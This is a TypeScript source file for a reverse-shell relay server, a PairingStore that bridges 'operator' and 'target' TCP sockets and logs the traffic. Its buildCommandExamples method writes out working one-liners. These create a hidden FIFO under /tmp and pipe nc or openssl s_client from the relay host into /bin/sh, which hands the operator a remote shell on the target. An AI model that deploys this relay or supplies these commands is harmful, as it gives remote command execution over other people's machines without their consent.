import { randomUUID } from "node:crypto";
import net from "node:net";

export type PairingRole = "operator" | "target";

export type PairingStatus =
	| "waiting"
	| "operator_connected"
	| "target_connected"
	| "bridged"
	| "closed";

export type PairingLogEntry = {
	seq: number;
	at: string;
	source: PairingRole;
	size: number;
	preview: string;
};

export type PairingSummary = {
	key: string;
	ownerUserId: string | null;
	label: string | null;
	status: PairingStatus;
	createdAt: string;
	lastActivityAt: string;
	operatorConnected: boolean;
	targetConnected: boolean;
	closedAt: string | null;
	closeReason: string | null;
	logCount: number;
};

type Pairing = {
	key: string;
	ownerUserId?: string;
	label?: string;
	createdAt: string;
	lastActivityAt: string;
	status: PairingStatus;
	sockets: Partial<Record<PairingRole, net.Socket>>;
	bufferBeforeBridge: Record<PairingRole, Buffer[]>;
	logs: PairingLogEntry[];
	sequence: number;
	closedAt?: string;
	closeReason?: string;
};

const MAX_LOG_ENTRIES = 200;

export class PairingStore {
	private readonly pairings = new Map<string, Pairing>();

	private readonly maxBufferCacheSize: number;

	constructor(maxBufferCacheBytes: number) {
		this.maxBufferCacheSize = maxBufferCacheBytes;
	}

	create(input: {
		ownerUserId?: string | null;
		label?: string | null;
	}): PairingSummary {
		const key = randomUUID().replace(/-/g, "").slice(0, 16);
		const now = new Date().toISOString();
		const { ownerUserId, label } = input;
		const pairing: Pairing = {
			key,
			...(typeof ownerUserId === "string" && ownerUserId.length > 0
				? { ownerUserId }
				: {}),
			...(typeof label === "string" && label.length > 0 ? { label } : {}),
			createdAt: now,
			lastActivityAt: now,
			status: "waiting",
			sockets: {},
			bufferBeforeBridge: {
				operator: [],
				target: [],
			},
			logs: [],
			sequence: 0,
		};
		this.pairings.set(key, pairing);
		return this.toSummary(pairing);
	}

	list(ownerUserId?: string): PairingSummary[] {
		return Array.from(this.pairings.values())
			.filter((pairing) =>
				ownerUserId ? pairing.ownerUserId === ownerUserId : true
			)
			.map((pairing) => this.toSummary(pairing));
	}

	get(key: string): Pairing | null {
		return this.pairings.get(key) ?? null;
	}

	getSummary(key: string): PairingSummary | null {
		const pairing = this.pairings.get(key);
		return pairing ? this.toSummary(pairing) : null;
	}

	getLogs(key: string, after?: number) {
		const pairing = this.pairings.get(key);
		if (!pairing) return null;
		const threshold = after ?? 0;
		const logs = pairing.logs.filter((entry) => entry.seq > threshold);
		return {
			pairing: this.toSummary(pairing),
			logs,
			currentSequence: pairing.sequence,
		};
	}

	send(key: string, role: PairingRole, payload: Buffer) {
		const pairing = this.pairings.get(key);
		if (!pairing)
			return {
				ok: false,
				status: 404,
				error: "PAIRING_NOT_FOUND",
			} as const;
		if (pairing.status === "closed")
			return { ok: false, status: 410, error: "PAIRING_CLOSED" } as const;
		const socket = pairing.sockets[role];
		if (!socket || socket.destroyed)
			return {
				ok: false,
				status: 409,
				error: "ROLE_NOT_CONNECTED",
			} as const;
		try {
			socket.write(payload);
			this.log(pairing, this.otherRole(role), payload);
			pairing.lastActivityAt = new Date().toISOString();
			return { ok: true } as const;
		} catch (error) {
			return {
				ok: false,
				status: 500,
				error: `WRITE_FAILED:${String(error)}`,
			} as const;
		}
	}

	close(key: string, reason: string) {
		const pairing = this.pairings.get(key);
		if (!pairing || pairing.status === "closed") return;
		pairing.status = "closed";
		pairing.closeReason = reason;
		pairing.closedAt = new Date().toISOString();
		pairing.lastActivityAt = pairing.closedAt;
		for (const role of ["operator", "target"] as PairingRole[]) {
			const socket = pairing.sockets[role];
			if (socket && !socket.destroyed) {
				try {
					socket.destroy();
				} catch (error) {
					console.warn("Failed to destroy socket", error);
				}
			}
		}
		pairing.sockets = {};
	}

	registerSocket(
		pairingKey: string,
		role: PairingRole,
		socket: net.Socket,
		initialData: Buffer
	) {
		const pairing = this.pairings.get(pairingKey);
		if (!pairing || pairing.status === "closed") {
			socket.destroy();
			return { ok: false, error: "PAIRING_NOT_FOUND" } as const;
		}
		const existing = pairing.sockets[role];
		if (existing && !existing.destroyed) {
			socket.destroy();
			return { ok: false, error: "ROLE_ALREADY_CONNECTED" } as const;
		}

		pairing.sockets[role] = socket;
		pairing.lastActivityAt = new Date().toISOString();
		if (pairing.status === "waiting") {
			pairing.status =
				role === "operator" ? "operator_connected" : "target_connected";
		} else if (pairing.status !== "bridged") {
			const { operator, target } = pairing.sockets;
			if (operator && target) pairing.status = "bridged";
		}

		if (initialData.length > 0) {
			this.buffer(pairing, this.otherRole(role), initialData);
		}
		this.flushIfReady(pairing);

		socket.on("data", (chunk: Buffer) => {
			if (chunk.length === 0) return;
			pairing.lastActivityAt = new Date().toISOString();
			this.log(pairing, role, chunk);
			this.forward(pairing, role, chunk);
		});

		socket.on("close", () =>
			this.handleSocketClosure(pairing, role, "socket-closed")
		);
		socket.on("error", (error) => {
			console.warn(`Socket error on pairing ${pairing.key}:`, error);
			this.handleSocketClosure(pairing, role, "socket-error");
		});

		return { ok: true } as const;
	}

	cleanup(pairingTtlMs: number, closedRetentionMs: number) {
		const now = Date.now();
		for (const pairing of this.pairings.values()) {
			if (pairing.status === "closed") {
				if (
					pairing.closedAt &&
					now - Date.parse(pairing.closedAt) > closedRetentionMs
				) {
					this.pairings.delete(pairing.key);
				}
				continue;
			}
			const age = now - Date.parse(pairing.createdAt);
			if (age > pairingTtlMs) {
				this.close(pairing.key, "expired");
			}
		}
	}

	statusSummary() {
		let active = 0;
		for (const pairing of this.pairings.values()) {
			if (pairing.status !== "closed") active += 1;
		}
		return { active, total: this.pairings.size };
	}

	buildCommandExamples(
		key: string,
		connection: { host: string; port: number; preferTls?: boolean }
	) {
		const { host, port, preferTls = false } = connection;
		const fifoName = `/tmp/.rs-${key.slice(0, 6)}`;
		const plain = {
			operator: `(printf 'AUTH ${key} operator\\n'; cat) | nc ${host} ${port}`,
			target: `mkfifo ${fifoName} 2>/dev/null; (printf 'AUTH ${key} target\\n'; cat ${fifoName}) | nc ${host} ${port} | /bin/sh > ${fifoName} 2>&1`,
		};
		const tls = {
			operator: `(printf 'AUTH ${key} operator\\n'; cat) | openssl s_client -quiet -connect ${host}:${port}`,
			target: `mkfifo ${fifoName} 2>/dev/null; (printf 'AUTH ${key} target\\n'; cat ${fifoName}) | openssl s_client -quiet -connect ${host}:${port} | /bin/sh > ${fifoName} 2>&1`,
		};
		return {
			defaultMode: preferTls ? "tls" : "plain",
			plain,
			tls,
		};
	}

	private toSummary(pairing: Pairing): PairingSummary {
		return {
			key: pairing.key,
			ownerUserId: pairing.ownerUserId ?? null,
			label: pairing.label ?? null,
			status: pairing.status,
			createdAt: pairing.createdAt,
			lastActivityAt: pairing.lastActivityAt,
			operatorConnected: Boolean(pairing.sockets.operator),
			targetConnected: Boolean(pairing.sockets.target),
			closedAt: pairing.closedAt ?? null,
			closeReason: pairing.closeReason ?? null,
			logCount: pairing.logs.length,
		};
	}

	private otherRole(role: PairingRole): PairingRole {
		return role === "operator" ? "target" : "operator";
	}

	private log(pairing: Pairing, source: PairingRole, chunk: Buffer) {
		const entry: PairingLogEntry = {
			seq: pairing.sequence + 1,
			at: new Date().toISOString(),
			source,
			size: chunk.length,
			preview: chunk.toString("utf8").slice(0, 400),
		};
		pairing.sequence = entry.seq;
		pairing.logs.push(entry);
		if (pairing.logs.length > MAX_LOG_ENTRIES) {
			pairing.logs.splice(0, pairing.logs.length - MAX_LOG_ENTRIES);
		}
	}

	private buffer(pairing: Pairing, targetRole: PairingRole, chunk: Buffer) {
		const buffers = pairing.bufferBeforeBridge[targetRole];
		buffers.push(chunk);
		const totalSize = buffers.reduce((acc, buf) => acc + buf.length, 0);
		if (totalSize > this.maxBufferCacheSize)
			buffers.splice(0, buffers.length);
	}

	private flushIfReady(pairing: Pairing) {
		const { operator, target } = pairing.sockets;
		if (!operator || !target) return;
		for (const role of ["operator", "target"] as PairingRole[]) {
			const socket = pairing.sockets[role];
			if (!socket || socket.destroyed) continue;
			const buffers = pairing.bufferBeforeBridge[role];
			while (buffers.length > 0) {
				const chunk = buffers.shift();
				if (!chunk) break;
				socket.write(chunk);
			}
		}
	}

	private forward(pairing: Pairing, targetRole: PairingRole, chunk: Buffer) {
		const socket = pairing.sockets[targetRole];
		if (socket && !socket.destroyed) {
			socket.write(chunk);
		} else {
			this.buffer(pairing, targetRole, chunk);
		}
	}

	private handleSocketClosure(
		pairing: Pairing,
		role: PairingRole,
		reason: string
	) {
		delete pairing.sockets[role];
		const { operator, target } = pairing.sockets;
		if (operator && target) {
			pairing.status = "bridged";
		} else if (operator) {
			pairing.status = "operator_connected";
		} else if (target) {
			pairing.status = "target_connected";
		} else {
			pairing.status = "waiting";
			this.close(pairing.key, reason);
		}
		pairing.lastActivityAt = new Date().toISOString();
	}
}
